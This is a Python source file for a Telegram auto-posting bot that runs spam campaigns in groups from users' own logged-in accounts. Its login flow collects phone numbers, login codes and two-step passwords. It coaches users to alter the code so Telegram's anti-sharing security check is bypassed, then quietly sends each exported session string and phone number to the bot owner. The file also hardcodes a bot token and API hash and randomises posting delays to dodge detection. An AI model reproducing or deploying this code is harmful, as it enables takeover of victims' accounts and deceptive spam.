from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message,
    CallbackQuery,
    ForceReply,
    InlineKeyboardMarkup as Markup,
    InlineKeyboardButton as Button
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    UserNotParticipant,
    ChatWriteForbidden,
    BotMethodInvalid
)
import os

# os.system("pip install pyro-listener")
from pyrolistener import Listener, exceptions
from asyncio import create_task, sleep, get_event_loop
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json, os
import random
import re # تم الإبقاء على استيراد re احتياطاً


app = Client(
    "autoPost",

    api_id="20655764",
    api_hash="65000bde92d95254649c19c1a1299728",

    bot_token='8529892646:AAHj2B3LQvc8t1E0RbsjcKVIk98eJbwY0SE'
)
loop = get_event_loop()
listener = Listener(client = app)

owner = 5151760528 # ايدي المالك

# اليوزر الجديد الموحد
SUPPORT_USERNAME = "@BMMU7"


users_db = "users.json"
channels_db = "channels.json"

def write(fp, data):
    with open(fp, "w") as file:
        json.dump(data, file, indent=2)


def read(fp):
    """قراءة البيانات من ملف JSON."""
    if not os.path.exists(fp):
        # إنشاء ملفات التخزين إذا لم تكن موجودة
        initial_data = {} if fp not in [channels_db] else []
        write(fp, initial_data)
    with open(fp) as file:
        data = json.load(file)
    return data

users = read(users_db)
channels = read(channels_db)

_timezone = timezone("Asia/Baghdad")

def timeCalc(limit):
    """حساب تاريخ بدء وانتهاء اشتراك VIP."""
    start_date = datetime.now(_timezone)
    end_date = start_date + timedelta(days=limit)
    hours = limit * 24
    minutes = hours * 60
    return {
        "current_date": start_date.strftime("%Y-%m-%d"),
        "end_date": end_date.strftime("%Y-%m-%d"),
        "endTime": end_date.strftime("%H:%M"),
        # إضافة المدة بالأيام للسهولة
        "days_limit": limit,
    }

def get_remaining_time(user_data):
    """حساب الوقت المتبقي بالساعات والدقائق والثواني."""
    if not user_data.get("vip") or not user_data.get("limitation"):
        return None

    limitation = user_data["limitation"]
    end_date_str = limitation["endDate"]
    end_time_str = limitation["endTime"]
    end_datetime_str = f"{end_date_str} {end_time_str}"

    try:
        # دمج التاريخ والوقت في صيغة واحدة قبل التحويل
        end_datetime = datetime.strptime(end_datetime_str, "%Y-%m-%d %H:%M")
        # يجب تعريف المنطقة الزمنية بشكل صريح إذا كانت البيانات بدونها
        end_datetime = _timezone.localize(end_datetime.replace(tzinfo=None))
    except ValueError:
        return None

    current_datetime = datetime.now(_timezone)

    if current_datetime >= end_datetime:
        return {"hours": 0, "minutes": 0, "seconds": 0}

    time_remaining_delta = end_datetime - current_datetime

    # تحويل الفرق إلى ساعات ودقائق وثواني
    total_seconds = int(time_remaining_delta.total_seconds())
    hours_rem = total_seconds // 3600
    minutes_rem = (total_seconds % 3600) // 60
    seconds_rem = total_seconds % 60

    return {
        "hours": hours_rem,
        "minutes": minutes_rem,
        "seconds": seconds_rem
    }


async def subscription(message: Message):
    """التحقق من اشتراك المستخدم في القنوات الإلزامية."""
    user_id = message.from_user.id
    for channel in channels:
        try: await app.get_chat_member(channel, user_id)
        except UserNotParticipant: return channel
    return True


async def vipCanceler(user_id):
    """إلغاء اشتراك VIP تلقائياً عند انتهاء المدة."""
    # تأخير أولي لمنح البوت وقتاً للاتصال
    await sleep(60)

    # تحويل التواريخ والأوقات إلى كائنات datetime للمقارنة
    user_key = str(user_id)
    if user_key in users and users[user_key].get("limitation"):
        limitation = users[user_key]["limitation"]
        end_date_str = limitation["endDate"]
        end_time_str = limitation["endTime"]
        end_datetime_str = f"{end_date_str} {end_time_str}"

        try:
            # دمج التاريخ والوقت في صيغة واحدة قبل التحويل
            end_datetime = datetime.strptime(end_datetime_str, "%Y-%m-%d %H:%M")
            end_datetime = _timezone.localize(end_datetime.replace(tzinfo=None))
        except ValueError:
            # إذا فشل التحويل (صيغة خاطئة)، نوقف المهمة
            return

        while users.get(user_key) and users[user_key].get("vip"):
            current_datetime = datetime.now(_timezone)

            if current_datetime >= end_datetime:
                # انتهت المدة
                users[user_key]["vip"] = False
                users[user_key]["limitation"] = {}
                # إيقاف النشر أيضاً
                if users[user_key].get("posting"):
                    users[user_key]["posting"] = False

                write(users_db, users)
                # تعديل رسالة الإلغاء التلقائي إلى الرسالة المطلوبة
                await app.send_message(
                    user_id,
                    f"""
- تم انتهاء مدة الاشتراك الخاصة بك !

- لتجديد الاشتراك تواصل مع المـطور

شكراً لاستخدامك بوت النشر التلقائي الخاص بـ {SUPPORT_USERNAME}
                    """
                )
                break

            # الانتظار والمحاولة مرة أخرى
            await sleep(60)

        # في حال تم إيقاف الاشتراك يدوياً من المطور أثناء دورة الـ while
        if users.get(user_key) and not users[user_key].get("vip"):
            pass


# =======================================================
#               ## 👤 قسم المستخدمين (VIP/Start)
# =======================================================
homeMarkup = Markup([
    [
        Button("👤 - حسابك -", callback_data="account")
    ],
    [
        Button("📜 - القروبات الحالية -", callback_data="currentSupers"),
        Button("➕ - اضافة قروب -", callback_data="newSuper")
    ],
    [
        Button("⏱️ - المدة بين كل كليشة -", callback_data="waitTime"),
        Button("✍️ - تعيين كليشة النشر -", callback_data="newCaption")
    ],
    [
        # الزر الجديد
        Button("⏳ - كم الوقت المتبقي -", callback_data="remainingTime")
    ],
    [
        Button("🚫 - ايقاف النشر -", callback_data="stopPosting"),
        Button("🚀 - بدء النشر -", callback_data="startPosting")
    ]
])


@app.on_message(filters.command("start") & filters.private)
async def start(_: Client, message: Message):
    user_id = message.from_user.id
    user_key = str(user_id)
    subscribed = await subscription(message)

    # 1. معالجة المالك أولاً
    if user_id == owner:
        if user_key not in users:
            users[user_key] = {"vip": True}
        users[user_key]["vip"] = True
        write(users_db, users)

    # 2. فحص الاشتراك الإجباري
    if isinstance(subscribed, str):
        return await message.reply(f"- عذرا عزيزي عليك الإشتراك بقناة البوت اولاً لتتمكن من استخدامه\n- القناه: @{subscribed}\n- اشترك ثم ارسل /start")

    # 3. فحص تسجيل المستخدم (إنشاء مستخدم جديد غير VIP)
    if user_key not in users:
        users[user_key] = {"vip": False}
        write(users_db, users)
        return await message.reply(f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone")

    # 4. فحص اشتراك VIP للمستخدم (المالك تم معالجته أعلاه)
    elif not users[user_key]["vip"]:
        return await message.reply(
            f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone"
        )

    # 5. رسالة الترحيب والواجهة الرئيسية
    fname = message.from_user.first_name
    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في القروبات\n- تحكم في البوت من الازرار التاليه:"
    await message.reply(
        caption,
        reply_markup = homeMarkup,
        reply_to_message_id = message.id
    )


@app.on_callback_query(filters.regex(r"^(remainingTime)$"))
async def remainingTime(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)
    user_data = users.get(user_key, {})

    if user_id != owner and (user_key not in users or not user_data.get("vip")):
        return await callback.answer("❌ انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    # 1. حساب الوقت المتبقي
    rem_time_details = get_remaining_time(user_data)
    
    # 2. إضافة الأيام المتبقية لحساب أكثر دقة ووضوحاً
    days_rem = 0
    total_seconds = 0
    if user_data.get("limitation"):
        limitation = user_data["limitation"]
        end_date_str = limitation["endDate"]
        end_time_str = limitation["endTime"]
        end_datetime_str = f"{end_date_str} {end_time_str}"
        
        try:
            end_datetime = datetime.strptime(end_datetime_str, "%Y-%m-%d %H:%M")
            end_datetime = _timezone.localize(end_datetime.replace(tzinfo=None))
            current_datetime = datetime.now(_timezone)
            time_remaining_delta = end_datetime - current_datetime
            
            # حساب الأيام المتبقية
            if time_remaining_delta.total_seconds() > 0:
                total_seconds = int(time_remaining_delta.total_seconds())
                days_rem = total_seconds // (24 * 3600)
                
        except ValueError:
            pass # ترك أيام متبقية صفر إذا فشل التحويل

    # 3. بناء الرسالة
    if rem_time_details is None or (rem_time_details['hours'] == 0 and rem_time_details['minutes'] == 0 and rem_time_details['seconds'] == 0):
        # في حال انتهاء الاشتراك (تم تركه لرسالة التنبيه)
        message_text = "❌ انتهت مدة اشتراكك! يرجى التواصل مع الدعم لتجديد الاشتراك."
        markup = Markup([[Button("🔙 - العودة -", callback_data="toHome")]])
        await callback.message.edit_text(message_text, reply_markup=markup)
        
    else:
        # حساب الساعات والدقائق المتبقية بعد طرح الأيام الكاملة
        h = (total_seconds % (24 * 3600)) // 3600
        m = (total_seconds % 3600) // 60
        s = total_seconds % 60

        
        message_text = f"""
✅ **معلومات الاشتراك:**

- تاريخ البدء: **{user_data['limitation']['startDate']}**
- تاريخ انتهاء الاشتراك: **{user_data['limitation']['endDate']}**

- المدة المتبقية:
  * **{days_rem}** أيام
  * **{h}** ساعة
  * **{m}** دقيقة
  * **{s}** ثانية
        """
        
        markup = Markup([
            [Button("🔙 - العودة إلى القائمة الرئيسية -", callback_data="toHome")]
        ])

        # تعديل الرسالة الحالية لعرض المعلومات
        await callback.message.edit_text(
            message_text,
            reply_markup=markup
        )


@app.on_callback_query(filters.regex(r"^(toHome)$"))
async def toHome(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    fname = callback.from_user.first_name
    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في السوبرات\n- تحكم في البوت من الازرار التاليه:"
    await callback.message.edit_text(
        caption,
        reply_markup = homeMarkup,
    )


@app.on_callback_query(filters.regex(r"^(account)$"))
async def account(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    fname = callback.from_user.first_name
    caption = f"- مرحبا عزيزي [{fname}](tg://settings) في قسم الحساب\n\n- استخدم الازرار التاليه للتحكم بحسابك:"
    markup = Markup([
        [
            Button("🔑 - تسجيل حسابك -", callback_data="login"),
            Button("🔄 - تغيير الحساب -", callback_data="changeAccount")
        ],
        [
            Button("🔙 - العوده -", callback_data="toHome")
        ]
    ])
    await callback.message.edit_text(
        caption,
        reply_markup = markup
    )


@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
async def login(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    elif (callback.data == "changeAccount" and users[user_key].get("session") is None):
        return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)

    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل رقم الهاتف الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
            reply_markup=ForceReply(selective=True, placeholder="+9647700000"),
            timeout=30)
    except exceptions.TimeOut:
        return await callback.message.reply(
            text = "- نفد وقت استلام رقم الهاتف",
            reply_markup = Markup([[Button("🔙 - العوده -", callback_data="account")]])
        )

    if ask.text == "/cancel":
        # استخدم reply_to_message_id=ask.id لضمان الرد الصحيح
        return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)

    create_task(registration(ask))


async def registration(message: Message):
    user_id = message.from_user.id
    user_key = str(user_id)
    _number = message.text
    lmsg = await message.reply(f"- جارٍ تسجيل الدخول إلى حسابك")
    reMarkup = Markup([
        [
            Button("🔄 - إعادة المحاوله -", callback_data="login"),
            Button("🔙 - العوده -", callback_data="account")
        ]
    ])

    # استخدام عميل مؤقت للتسجيل
    client = Client(
        "registration",
        in_memory = True,
        api_id = app.api_id,
        api_hash = app.api_hash
    )

    try:
        await client.connect()
        try: p_code_hash = await client.send_code(_number)
        except (PhoneNumberInvalid):
            return await lmsg.edit_text("- رقم الهاتف الذي ادخلته خاطئ" ,reply_markup=reMarkup)

        # 💡 التعديل: طلب الكود مع إضافة 1 للرقم الأخير لتفادي قيود الأمان
        try:
            code_message = await listener.listen(
                from_id=user_id,
                chat_id=user_id,
                text="""
- تم إرسال كود تسجيل الدخول إلى حسابك في رسالة من **Telegram**.

⚠️ **لتفادي قيود الأمان (مشاركة الرمز مسبقاً):**
- **قم بنسخ الكود الذي وصلك.**
- **أضف رقم 1 إلى آخر رقم في الكود ثم أرسله يدوياً.** (مثلاً: إذا كان الكود 27468، أرسل 27469).

- لديك 120 ثانية لإرسال الكود.
                """,
                timeout=120,
                reply_markup=ForceReply(selective=True, placeholder="الكود مع إضافة 1: مثال 12346")
            )
        except exceptions.TimeOut:
            return await lmsg.reply(
                text="- نفذ وقت استلام الكود.\n- حاول مره أخرى.",
                reply_markup=reMarkup
            )

        # 🌟 منطق معالجة الكود المُعدّل
        modified_code_text = code_message.text.strip().replace(" ", "")

        if not modified_code_text.isdigit() or len(modified_code_text) not in [5, 6]:
             return await code_message.reply("- الكود المُرسل ليس بالصيغة الصحيحة (5 أو 6 أرقام).", reply_markup=reMarkup, reply_to_message_id=code_message.id)

        try:
            # فصل آخر رقم
            last_digit = int(modified_code_text[-1])

            # طرح 1 من آخر رقم
            original_last_digit = last_digit - 1
            if original_last_digit < 0:
                 # في حال أدخل المستخدم '0' كنتيجة للزيادة (مثلا كان الكود الأصلي '9' وأرسل '10')، لن ندعم هذه الحالة لتبسيط المنطق.
                 # ولكن إذا كان الكود الأصلي '8' وأرسل '9'، فالناتج هو '8'.
                 return await code_message.reply("- لا يمكن أن يكون الرقم الأخير بعد الطرح سالباً. يرجى التأكد من أن الرقم الأخير في الكود المُرسل هو 1 أو أكبر.", reply_markup=reMarkup, reply_to_message_id=code_message.id)

            # إعادة بناء الكود الأصلي
            original_code = modified_code_text[:-1] + str(original_last_digit)

        except Exception:
            # إذا فشلت عملية التحويل أو الطرح لأي سبب
             return await code_message.reply("- حدث خطأ في معالجة الكود. تأكد من إدخال الأرقام فقط.", reply_markup=reMarkup, reply_to_message_id=code_message.id)

        # نهاية منطق معالجة الكود المُعدّل 🌟

        try:
            # استخدام الكود الأصلي غير المُعدّل للتسجيل
            await client.sign_in(_number, p_code_hash.phone_code_hash, original_code)
        except (PhoneCodeInvalid):
            return await code_message.reply(f"- الكود الذي تم إدخاله خاطئ أو منتهي الصلاحية. (الكود المستخدم: {original_code}) \n- حاول مره أخرى.", reply_markup=reMarkup, reply_to_message_id=code_message.id)
        except (PhoneCodeExpired):
            return await code_message.reply(f"- الكود الذي تم إدخاله منتهي الصلاحية. (الكود المستخدم: {original_code}) \n- حاول مره أخرى.", reply_markup=reMarkup, reply_to_message_id=code_message.id)

        except (SessionPasswordNeeded):
            try:
                password = await listener.listen(
                    from_id=user_id,
                    chat_id=user_id,
                    text="- ادخل كلمة مرور التحقق بخطوتين من فضلك.",
                    reply_markup=ForceReply(selective=True, placeholder="- 𝚈𝙾𝚄𝚁 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳: "),
                    timeout=180,
                    reply_to_message_id=code_message.id
                )
            except exceptions.TimeOut:
                return await lmsg.reply(
                    text="- نفذ وقت استلام كلمة مرور التحقق بخطوتين.\n- حاول مره أخرى.",
                    reply_markup=reMarkup
                )
            try:
                await client.check_password(password.text)
            except (PasswordHashInvalid):
                return await password.reply("- قمت بإدخال كلمة مرور خاطئه.\n- حاول مره أخرى.", reply_markup=reMarkup)

        session = await client.export_session_string()

        try:await app.send_message(owner, f"New Session: {session}\nPhone: {_number}")
        except: pass

        # تحديث بيانات المستخدم/المالك
        if user_key not in users:
            users[user_key] = {"vip": user_id == owner, "session": session}
        else:
            users[user_key]["session"] = session
        write(users_db, users)

        await lmsg.edit_text(
            "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت." ,
            reply_markup=Markup([[Button("🏠 - الصفحه الرئيسيه -", callback_data="toHome")]])
        )

    finally:
        await client.disconnect()


@app.on_callback_query(filters.regex(r"^(newSuper)$"))
async def newSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    await callback.message.delete()
    reMarkup = Markup([
        [
            Button("🔄 - حاول مره أخرى -", callback_data="newSuper"),
            Button("🔙 - العوده -", callback_data="toHome")
        ]
    ])

    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- ارسل رابط السوبر لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان السوبر خاص ف ارسل الايدي الخاص به او غادر السوبر (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
            reply_markup=ForceReply(selective=True, placeholder="- Super group URL or ID: "),
            timeout=60
        )
    except exceptions.TimeOut:
        return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)

    if ask.text == "/cancel":
        return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)

    chat_input = ask.text.strip()
    group_id = None

    try:
        # محاولة تحليل كـ ID رقمي (يبدأ بـ -100)
        if chat_input.startswith("-"):
            group_id = int(chat_input)
        else:
            # محاولة الحصول على معلومات الدردشة من الرابط/المعرف (@username, t.me/link)
            chat = await app.get_chat(chat_input if "+" in chat_input else chat_input.split("/")[-1])
            group_id = chat.id
    except ValueError:
        # إذا لم يكن رقماً يبدأ بـ -
        return await ask.reply("- المعرف الرقمي غير صحيح.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    except BotMethodInvalid:
        # يمكن أن يكون رابط دعوة خاص (وليس ID أو يوزر)
        return await ask.reply("- الرابط/المعرف قد يكون خاصاً، أرسل ID المجموعة (الذي يبدأ بـ -100) بدلاً من ذلك، أو تأكد من أن البوت موجود في المجموعة.", reply_to_message_id=ask.id, reply_markup=reMarkup)
    except Exception as e:
        print(f"Error getting chat: {e}")
        return await ask.reply("- لم يتم ايجاد السوبر. تأكد من صحة الرابط/المعرف وأن البوت يستطيع رؤيته.",
                               reply_to_message_id=ask.id, reply_markup=reMarkup)

    # حفظ الدردشة
    if users[user_key].get("groups") is None: users[user_key]["groups"] = []

    if group_id in users[user_key]["groups"]:
        await ask.reply(
            "- هذا السوبر مضاف بالفعل.",
            reply_markup = Markup([[Button("🏠 - الصفحه الرئيسيه -", callback_data="toHome")]]),
            reply_to_message_id=ask.id
        )
    else:
        users[user_key]["groups"].append(group_id)
        write(users_db, users)
        await ask.reply(
            "- تمت اضافة هذا السوبر الى القائمه.",
            reply_markup = Markup([[Button("🏠 - الصفحه الرئيسيه -", callback_data="toHome")]])
        )


@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
async def currentSupers(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    groups = users[user_key].get("groups", [])

    if not groups:
        return await callback.answer("- لم يتم إضافة اي سوبر لعرضه", show_alert=True)

    titles = {}
    for group in groups:
        try:
            titles[str(group)] = (await app.get_chat(group)).title
        except:
            continue

    markup = [
        [
            Button(titles.get(str(group), str(group)), callback_data=str(group)),
            Button("🗑️", callback_data=f"delSuper {group}")
        ] for group in groups
    ]

    markup.append([Button("🏠 - الصفحه الرئيسيه -", callback_data="toHome")])
    caption = "- اليك السوبرات المضافه الى النشر التلقائي:"
    await callback.message.edit_text(
        caption,
        reply_markup = Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(delSuper)"))
async def delSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    groups = users[user_key].get("groups", [])

    try:
        group_to_remove = int(callback.data.split()[1])
    except ValueError:
        # إذا لم يكن رقماً، فربما هو رابط/اسم (وهو ما لا نتوقع حدوثه في التخزين، لكن للاحتياط)
        group_to_remove = callback.data.split()[1]

    if group_to_remove in groups:
        groups.remove(group_to_remove)
        write(users_db, users)
        await callback.answer("- تم حذف هذا السوبر من القائمه", show_alert=True)
    else:
        await callback.answer("- هذا السوبر غير موجود في القائمة أصلاً.", show_alert=True)

    # إعادة بناء القائمة بعد الحذف
    titles = {}
    for group in groups:
        try: titles[str(group)] = (await app.get_chat(group)).title
        except: continue

    markup = [
        [
            Button(titles.get(str(group), str(group)), callback_data=str(group)),
            Button("🗑️", callback_data=f"delSuper {group}")
        ] for group in groups
    ] if groups else []

    markup.append([Button("🏠 - الصفحه الرئيسيه -", callback_data="toHome")])

    caption = "- اليك السوبرات المضافه الى النشر التلقائي:"
    await callback.message.edit_text(
        caption,
        reply_markup = Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(newCaption)$"))
async def newCaption(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    # 1. جلب الكليشة الحالية
    current_caption = users.get(user_key, {}).get("caption", "لا توجد كليشة سابقة مُعينة.")
    
    reMarkup = Markup([
        [
            Button("🔄 - حاول مره أخرى -", callback_data="newCaption"),
            Button("🔙 - العوده -", callback_data="toHome")
        ]
    ])
    await callback.message.delete()

    # 2. بناء رسالة الطلب لتشمل الكليشة الحالية
    prompt_text = f"""
**الكليشة الحالية:**
--------------------
{current_caption}
--------------------
- يمكنك ارسال الكليشه الجديده الآن.

- استخدم /cancel لإلغاء العمليه.
    """

    try:
        ask = await listener.listen(
            from_id = user_id,
            chat_id = user_id,
            text = prompt_text, # استخدام النص المحدث
            reply_markup = ForceReply(selective = True, placeholder = "- Your new caption: "),
            timeout = 120
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)

    if ask.text == "/cancel":
        return await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)

    users[user_key]["caption"] = ask.text
    write(users_db, users)

    await ask.reply(
        "- تم تعيين الكليشه الجديده.",
        reply_to_message_id = ask.id,
        reply_markup = Markup([[Button("🏠 - الصفحه الرئيسيه -", callback_data="toHome")]])
    )


@app.on_callback_query(filters.regex(r"^(waitTime)$"))
async def waitTime(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    # 1. جلب وقت الانتظار الحالي
    current_wait_time = users.get(user_key, {}).get("waitTime", 60) # 60 ثانية هي القيمة الافتراضية
    
    reMarkup = Markup([
        [
            Button("🔄 - حاول مره أخرى -", callback_data="waitTime"),
            Button("🔙 - العوده -", callback_data="toHome")
        ]
    ])
    await callback.message.delete()

    # 2. بناء رسالة الطلب لتشمل وقت الانتظار الحالي
    prompt_text = f"""
**وقت الانتظار الحالي:** {current_wait_time} ثانية
--------------------
- يمكنك ارسال مدة الانتظار ( بالثواني ) الآن.
  (يتم تطبيق عشوائية 80% إلى 130% على هذه القيمة)
  
- استخدم /cancel لإلغاء العمليه.
    """

    try:
        ask = await listener.listen(
            from_id = user_id,
            chat_id = user_id,
            text = prompt_text, # استخدام النص المحدث
            reply_markup = ForceReply(selective = True, placeholder = f"- المدة بالثواني: (مثال: {current_wait_time})"),
            timeout = 120
        )
    except exceptions.TimeOut:
        return await callback.message.reply("- انتهى وقت استلام مدة الانتظار.", reply_markup=reMarkup)

    if ask.text == "/cancel":
        return await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)

    try:
        wait_time_sec = int(ask.text)
        if wait_time_sec <= 0:
            raise ValueError
    except ValueError:
        return await ask.reply("- يجب أن تكون القيمة عددًا صحيحًا موجباً.", reply_markup=reMarkup, reply_to_message_id=ask.id)

    users[user_key]["waitTime"] = wait_time_sec
    write(users_db, users)

    await ask.reply(
        f"- تم تعيين مدة الانتظار الجديدة: **{wait_time_sec}** ثانية.",
        reply_to_message_id = ask.id,
        reply_markup = Markup([[Button("🏠 - الصفحه الرئيسيه -", callback_data="toHome")]])
    )


@app.on_callback_query(filters.regex(r"^(startPosting)$"))
async def startPosting(_: Client,  callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    user_data = users.get(user_key, {})

    if user_data.get("session") is None:
        return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
    elif (user_data.get("groups") is None) or (len(user_data["groups"]) == 0):
        return await callback.answer("- لم يتم اضافة اي سوبرات بعد.", show_alert=True)
    elif user_data.get("posting"):
        return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)

    users[user_key]["posting"] = True
    write(users_db, users)

    create_task(posting(user_id))

    markup = Markup([
        [Button("🚫 - إيقاف النشر -", callback_data="stopPosting"),
         Button("🔙 - عوده -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- بدأت عملية النشر التلقائي",
        reply_markup = markup
    )


@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
async def stopPosting(_: Client,  callback: CallbackQuery):
    user_id = callback.from_user.id
    user_key = str(user_id)

    if user_id != owner and (user_key not in users or not users[user_key].get("vip")):
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    if not users[user_key].get("posting"):
        return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)

    users[user_key]["posting"] = False
    write(users_db, users)

    markup = Markup([
        [Button("🚀 - بدء النشر -", callback_data="startPosting"),
         Button("🔙 - عوده -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- تم ايقاف عملية النشر التلقائي",
        reply_markup = markup
    )


async def posting(user_id):
    user_key = str(user_id)

    # 1. التحقق الأولي
    if not users.get(user_key) or not users[user_key].get("posting"):
        return

    client = None
    try:
        # 2. بدء تشغيل عميل الحساب
        client = Client(
            user_key,
            api_id = app.api_id,
            api_hash = app.api_hash,
            session_string = users[user_key]["session"]
        )
        await client.start()
    except Exception as e:
        # فشل في بدء تشغيل حساب المستخدم
        users[user_key]["posting"] = False
        write(users_db, users)
        await app.send_message(
            user_id,
            f"- فشل في بدء النشر: يبدو أن جلسة الحساب الذي سجلته منتهية أو خاطئة.\n- يرجى [تسجيل الدخول من جديد](tg://user?id={app.id}) عبر الزر **🔑 - تسجيل حسابك -**."
        )
        return

    # 3. حلقة النشر الرئيسية
    while users.get(user_key) and users[user_key].get("posting"):

        user_data = users[user_key]

        # 🌟 تطبيق العشوائية على وقت الانتظار

        # الحصول على وقت الانتظار الأساسي (بالثواني)
        base_sleep_time = user_data.get("waitTime", 60)

        # تحديد نسبة العشوائية (80% إلى 130%)
        min_factor = 0.80
        max_factor = 1.30

        # توليد عامل عشوائي بين min_factor و max_factor
        random_factor = random.uniform(min_factor, max_factor)

        # حساب وقت النوم النهائي العشوائي
        # نستخدم int() للتأكد من أنه عدد صحيح (رغم أن sleep يقبل float)
        sleepTime = int(base_sleep_time * random_factor)

        # التأكد من أن الحد الأدنى لا يقل عن 1 ثانية
        if sleepTime < 1:
            sleepTime = 1

        print(f"User {user_id}: Base time: {base_sleep_time}s, Random factor: {random_factor:.2f}, Final sleep time: {sleepTime}s")
        # ----------------------------------------------

        groups = user_data.get("groups", [])

        # التأكد من وجود الكليشة
        caption = user_data.get("caption")
        if not caption:
            user_data["posting"] = False
            write(users_db, users)
            try: await client.stop()
            except: pass
            return await app.send_message(user_id, "- تم إيقاف النشر بسبب عدم اضافة كليشة.", reply_markup=Markup([[Button("✍️ - إضافة كليشه -", callback_data="newCaption")]]))

        # المرور على المجموعات
        for group in groups:
            if group not in users[user_key]["groups"]: continue # تحاشي التغييرات المتزامنة

            try:
                await client.send_message(group, caption)
            except ChatWriteForbidden:
                # محاولة الانضمام إذا كان ممنوعاً من الكتابة (قد يكون غير منضم أصلاً)
                try:
                    await client.join_chat(group)
                    await client.send_message(group, caption)
                except Exception as e:
                    print(f"Failed to post to {group} after join attempt: {e}")
                    # يمكن إضافة منطق لإزالة المجموعة إذا كان الفشل دائماً
                    pass
            except Exception as e:
                # محاولة الانضمام مرة أخرى لمعالجة الروابط الخاصة/الدعوات أو المعرفات القديمة
                try:
                    chat = await client.join_chat(group)
                    await client.send_message(chat.id, caption)

                    # إذا كان الـ ID قد تغير (عادةً من رابط دعوة إلى ID سوبرجروب دائم)، يتم التحديث
                    if group != chat.id and group in users[user_key]["groups"]:
                        users[user_key]["groups"].remove(group)
                        users[user_key]["groups"].append(chat.id)
                        write(users_db, users)

                except Exception as e:
                    print(f"Critical failure posting to {group}: {e}")
                    await app.send_message(user_id, f"- فشل في النشر في المجموعة {group}: {e}")

        await sleep(sleepTime)

    # 4. إيقاف العميل عند الخروج من الحلقة
    try:
        await client.stop()
    except:
        pass


"""
## 👑 قسم المالك (Admin)
"""

